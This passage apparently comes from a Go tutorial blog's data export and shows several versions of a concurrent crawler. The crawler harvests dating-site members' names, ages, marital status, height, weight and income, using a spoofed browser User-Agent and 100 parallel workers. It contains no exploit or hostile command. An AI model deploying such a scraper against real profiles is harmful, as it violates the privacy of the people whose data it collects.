client.Do(req) if err != nil &#123; log.Fatalln(err) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/var cityRe = regexp.MustCompile(`&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`)var cityUrlRe = regexp.MustCompile(`&lt;a href=\"(http://www.zhenai.com/zhenghun/[^\"]+)\"`)func ParseCity(contents []byte) ParseResult&#123; matches:= cityRe.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; name:=string(m[2]) println(string(m[1])) result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,name) &#125;, &#125;) &#125; //查找城市页面下的城市链接 matches= cityUrlRe.FindAllSubmatch(contents,-1) for _,m:= range matches&#123; result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; for _,m :=range matches&#123; result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Age) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(.*)座&lt;/div&gt;`)var height =regexp.MustCompile(`160cm`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)//解析器 解析用户//name为上一级传递过来的func PaesrProfile(contents []byte,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) //用户结构体 profile:=Profile&#123;&#125; profile.Name = name //年龄 string转换为int age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; //身高 height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; //体重 weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; //薪水 profile.Salary = extractString(contents,salary) //星座 profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]interface&#123;&#125;&#123;profile&#125;, &#125; return result&#125;//封装 正则表达式匹配func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go 单任务版引擎*/func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;//具体的工作 传递一个request，通过解析器对url进行解析func worker(r Request)(ParseResult,error)&#123; fmt.Printf(\"Fetching %s\\n\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) return ParseResult&#123;&#125;,err &#125; return r.ParserFunc(body),nil&#125;// 并发版爬虫引擎 包含了调度器 与 工人数type ConcurrentEngine struct&#123; Scheduler Scheduler WorkerCount int&#125;//调度器是一个接口，扩展性type Scheduler interface &#123; //提交Request进行执行 Submit(Request) WorkerChan() chan Request WorkerReady(chan Request) Run()&#125;//并发版爬虫引擎func (e *ConcurrentEngine) Run(seeds ...Request)&#123; out:= make(chan ParseResult) //配置调度器通道 e.Scheduler.Run() //开启WorkerCount个工作 for i:=0;i&lt;e.WorkerCount;i++&#123; createWorker(e.Scheduler.WorkerChan(),out,e.Scheduler) &#125; //种子首先运行 for _,r:=range seeds&#123; e.Scheduler.Submit(r) &#125; itemsCount:=0 for&#123; //out等待接受ParseResult result:=&lt;-out //打印出接收到的数据，以及个数。 for _,item:= range result.Items&#123; fmt.Printf(\"Got item: #%d: %v\\n\",itemsCount,item) itemsCount++ &#125; //分配任务 for _,request:= range result.Requests&#123; if isDuplicate(request.Url)&#123; continue &#125; e.Scheduler.Submit(request) &#125; &#125;&#125;//存储URL、实行去掉重复URL的操作var URLstore = make(map[string]bool)func isDuplicate(url string) bool&#123; if URLstore[url]&#123; return true &#125; URLstore[url] = true return false&#125;//工作函数，逻辑是 in通道接收到request，即会调用worker函数爬每一个request中的网址，用对应的解析器。 解析完成后，将ParseResult返回给通道outfunc createWorker(in chan Request,out chan ParseResult,s Scheduler) &#123; go func()&#123; for&#123; //传递到调度器，提示可以开始工作 s.WorkerReady(in) //有任务到工作中 request := &lt;-in //开始工作 result,err:= worker(request) if err!=nil&#123; continue &#125; //工作结果返回 out &lt;-result &#125; &#125;()&#125;/* end engine.go *//* start scheduler.go 简单版调度器，用于分配工作任务 */type SimpleScheduler struct&#123; //通道 workerChan chan Request&#125;func (s *SimpleScheduler) WorkerChan() chan Request &#123; return s.workerChan&#125;func (s *SimpleScheduler) WorkerReady(chan Request) &#123;&#125;func (s *SimpleScheduler) Run() &#123; s.workerChan = make(chan Request)&#125;func ( s *SimpleScheduler) Submit( r Request) &#123; //为了防止死锁，在调度器中建立go的协程 分配任务到通道中。 go func()&#123;s.workerChan &lt;- r&#125;()&#125;/* end scheduler.go *//* start Queuescheduler.go 队列调度器，用于分配工作任务 */type QueuedScheduler struct &#123; requestChan chan Request workerChan chan chan Request&#125;func (s *QueuedScheduler) WorkerChan() chan Request &#123; return make(chan Request)&#125;//提交任务到通道，说明需要完成任务func (s *QueuedScheduler) Submit(r Request) &#123; s.requestChan &lt;-r&#125;//提交工作到通道，说明准备好工作了func (s *QueuedScheduler) WorkerReady(w chan Request)&#123; s.workerChan &lt;- w&#125;func (s * QueuedScheduler) Run()&#123; s.workerChan =make(chan chan Request) s.requestChan = make(chan Request) go func()&#123; //任务队列 var requestQ []Request //工作队列 var workQ []chan Request for&#123; var activeRequest Request var activework chan Request //即有工作又有任务，开始工作 if len(requestQ)&gt;0 &amp;&amp; len(workQ) &gt;0&#123; activework = workQ[0] activeRequest = requestQ[0] &#125; select &#123; //任务增加，添加到队列中 case r:=&lt;-s.requestChan: requestQ = append(requestQ,r) //工作增加，添加到队列中 case w:= &lt;-s.workerChan: workQ = append(workQ,w) //有工作又有任务，让工作去做任务 case activework &lt;- activeRequest: workQ = workQ[1:] requestQ=requestQ[1:] &#125; &#125; &#125;()&#125;/* end Queuescheduler.go 队列调度器，用于分配工作任务 */func main()&#123; e:= ConcurrentEngine&#123; Scheduler:&amp;QueuedScheduler&#123;&#125;, WorkerCount:100, &#125; e.Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun/shanghai\", ParserFunc:ParseCity, &#125;) //并发调度版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;QueuedScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) // ////并发版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;SimpleScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //单任务版爬虫 //Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //paseTest()&#125;//测试func paseTest()&#123; contents,_:= ioutil.ReadFile(\"test.html\") profile:=Profile&#123;&#125; age,err:= strconv.Atoi(extractString(contents,ageRe)) if err!=nil&#123; profile.Age = age &#125; height,err:= strconv.Atoi(extractString(contents,height)) if err!=nil&#123; profile.Height = height &#125; weight,err:= strconv.Atoi(extractString(contents,weight)) if err!=nil&#123; profile.Weight = weight &#125; profile.Salary = extractString(contents,salary) profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; fmt.Printf(\"%s\",profile)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[57]-爬虫-调度器","slug":"golang-57-crawler-scheduler","date":"2019-01-24T04:55:43.000Z","updated":"2019-02-04T08:34:27.576Z","comments":true,"path":"2019/01/24/golang-57-crawler-scheduler/","link":"","permalink":"https://dreamerjonson.com/2019/01/24/golang-57-crawler-scheduler/","excerpt":"","text":"单任务与并发同时适用的调度器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\" \"time\")var rateLimiter = time.Tick(100 * time.Millisecond)/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; log.Fatalln(err) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := client.Do(req) if err != nil &#123; log.Fatalln(err) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/const cityRe = `&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`func ParseCity(contents []byte) ParseResult&#123; re:= regexp.MustCompile(cityRe) matches:= re.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; name:=string(m[2]) println(string(m[1])) result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,name) &#125;, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; for _,m :=range matches&#123; result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Age) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(.*)座&lt;/div&gt;`)var height =regexp.MustCompile(`160cm`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)//解析器 解析用户//name为上一级传递过来的func PaesrProfile(contents []byte,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) //用户结构体 profile:=Profile&#123;&#125; profile.Name = name //年龄 string转换为int age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; //身高 height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; //体重 weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; //薪水 profile.Salary = extractString(contents,salary) //星座 profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]interface&#123;&#125;&#123;profile&#125;, &#125; return result&#125;//封装 正则表达式匹配func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go 单任务版引擎*/func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;//具体的工作 传递一个request，通过解析器对url进行解析func worker(r Request)(ParseResult,error)&#123; fmt.Printf(\"Fetching %s\\n\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) return ParseResult&#123;&#125;,err &#125; return r.ParserFunc(body),nil&#125;// 并发版爬虫引擎 包含了调度器 与 工人数type ConcurrentEngine struct&#123; Scheduler Scheduler WorkerCount int&#125;//调度器是一个接口，扩展性type Scheduler interface &#123; //提交Request进行执行 Submit(Request) WorkerChan() chan Request WorkerReady(chan Request) Run()&#125;//并发版爬虫引擎func (e *ConcurrentEngine) Run(seeds ...Request)&#123; out:= make(chan ParseResult) //配置调度器通道 e.Scheduler.Run() //开启WorkerCount个工作 for i:=0;i&lt;e.WorkerCount;i++&#123; createWorker(e.Scheduler.WorkerChan(),out,e.Scheduler) &#125; //种子首先运行 for _,r:=range seeds&#123; e.Scheduler.Submit(r) &#125; itemsCount:=0 for&#123; //out等待接受ParseResult result:=&lt;-out //打印出接收到的数据，以及个数。 for _,item:= range result.Items&#123; fmt.Printf(\"Got item: #%d: %v\\n\",itemsCount,item) itemsCount++ &#125; //分配任务 for _,request:= range result.Requests&#123; e.Scheduler.Submit(request) &#125; &#125;&#125;//工作函数，逻辑是 in通道接收到request，即会调用worker函数爬每一个request中的网址，用对应的解析器。 解析完成后，将ParseResult返回给通道outfunc createWorker(in chan Request,out chan ParseResult,s Scheduler) &#123; go func()&#123; for&#123; //传递到调度器，提示可以开始工作 s.WorkerReady(in) //有任务到工作中 request := &lt;-in //开始工作 result,err:= worker(request) if err!=nil&#123; continue &#125; //工作结果返回 out &lt;-result &#125; &#125;()&#125;/* end engine.go *//* start scheduler.go 简单版调度器，用于分配工作任务 */type SimpleScheduler struct&#123; //通道 workerChan chan Request&#125;func (s *SimpleScheduler) WorkerChan() chan Request &#123; return s.workerChan&#125;func (s *SimpleScheduler) WorkerReady(chan Request) &#123;&#125;func (s *SimpleScheduler) Run() &#123; s.workerChan = make(chan Request)&#125;func ( s *SimpleScheduler) Submit( r Request) &#123; //为了防止死锁，在调度器中建立go的协程 分配任务到通道中。 go func()&#123;s.workerChan &lt;- r&#125;()&#125;/* end scheduler.go *//* start Queuescheduler.go 队列调度器，用于分配工作任务 */type QueuedScheduler struct &#123; requestChan chan Request workerChan chan chan Request&#125;func (s *QueuedScheduler) WorkerChan() chan Request &#123; return make(chan Request)&#125;//提交任务到通道，说明需要完成任务func (s *QueuedScheduler) Submit(r Request) &#123; s.requestChan &lt;-r&#125;//提交工作到通道，说明准备好工作了func (s *QueuedScheduler) WorkerReady(w chan Request)&#123; s.workerChan &lt;- w&#125;func (s * QueuedScheduler) Run()&#123; s.workerChan =make(chan chan Request) s.requestChan = make(chan Request) go func()&#123; //任务队列 var requestQ []Request //工作队列 var workQ []chan Request for&#123; var activeRequest Request var activework chan Request //即有工作又有任务，开始工作 if len(requestQ)&gt;0 &amp;&amp; len(workQ) &gt;0&#123; activework = workQ[0] activeRequest = requestQ[0] &#125; select &#123; //任务增加，添加到队列中 case r:=&lt;-s.requestChan: requestQ = append(requestQ,r) //工作增加，添加到队列中 case w:= &lt;-s.workerChan: workQ = append(workQ,w) //有工作又有任务，让工作去做任务 case activework &lt;- activeRequest: workQ = workQ[1:] requestQ=requestQ[1:] &#125; &#125; &#125;()&#125;/* end Queuescheduler.go 队列调度器，用于分配工作任务 */func main()&#123; e:= ConcurrentEngine&#123; Scheduler:&amp;QueuedScheduler&#123;&#125;, WorkerCount:100, &#125; e.Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun\", ParserFunc:ParseCityList, &#125;) ////并发版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;SimpleScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //单任务版爬虫 //Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //paseTest()&#125;//测试func paseTest()&#123; contents,_:= ioutil.ReadFile(\"test.html\") profile:=Profile&#123;&#125; age,err:= strconv.Atoi(extractString(contents,ageRe)) if err!=nil&#123; profile.Age = age &#125; height,err:= strconv.Atoi(extractString(contents,height)) if err!=nil&#123; profile.Height = height &#125; weight,err:= strconv.Atoi(extractString(contents,weight)) if err!=nil&#123; profile.Weight = weight &#125; profile.Salary = extractString(contents,salary) profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; fmt.Printf(\"%s\",profile)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[56]-爬虫-并发队列引擎","slug":"golang-56-crawler-queue","date":"2019-01-24T04:38:48.000Z","updated":"2019-02-04T08:34:22.045Z","comments":true,"path":"2019/01/24/golang-56-crawler-queue/","link":"","permalink":"https://dreamerjonson.com/2019/01/24/golang-56-crawler-queue/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\" \"time\")var rateLimiter = time.Tick(100 * time.Millisecond)/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; log.Fatalln(err) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := client.Do(req) if err != nil &#123; log.Fatalln(err) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/const cityRe = `&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`func ParseCity(contents []byte) ParseResult&#123; re:= regexp.MustCompile(cityRe) matches:= re.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; name:=string(m[2]) println(string(m[1])) result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,name) &#125;, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; for _,m :=range matches&#123; result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Age) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(.*)座&lt;/div&gt;`)var height =regexp.MustCompile(`160cm`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)//解析器 解析用户//name为上一级传递过来的func PaesrProfile(contents []byte,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) //用户结构体 profile:=Profile&#123;&#125; profile.Name = name //年龄 string转换为int age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; //身高 height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; //体重 weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; //薪水 profile.Salary = extractString(contents,salary) //星座 profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]interface&#123;&#125;&#123;profile&#125;, &#125; return result&#125;//封装 正则表达式匹配func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go 单任务版引擎*/func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;//具体的工作 传递一个request，通过解析器对url进行解析func worker(r Request)(ParseResult,error)&#123; fmt.Printf(\"Fetching %s\\n\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) return ParseResult&#123;&#125;,err &#125; return r.ParserFunc(body),nil&#125;// 并发版爬虫引擎 包含了调度器 与 工人数type ConcurrentEngine struct&#123; Scheduler Scheduler WorkerCount int&#125;//调度器是一个接口，扩展性type Scheduler interface &#123; //提交Request进行执行 Submit(Request) //配置通道 ConfigureMasterWorkChan(chan Request) WorkerReady(chan Request) Run()&#125;//并发版爬虫引擎func (e *ConcurrentEngine) Run(seeds ...Request)&#123; out:= make(chan ParseResult) //配置调度器通道 e.Scheduler.Run() //开启WorkerCount个工作 for i:=0;i&lt;e.WorkerCount;i++&#123; createWorker(out,e.Scheduler) &#125; //种子首先运行 for _,r:=range seeds&#123; e.Scheduler.Submit(r) &#125; itemsCount:=0 for&#123; //out等待接受ParseResult result:=&lt;-out //打印出接收到的数据，以及个数。 for _,item:= range result.Items&#123; 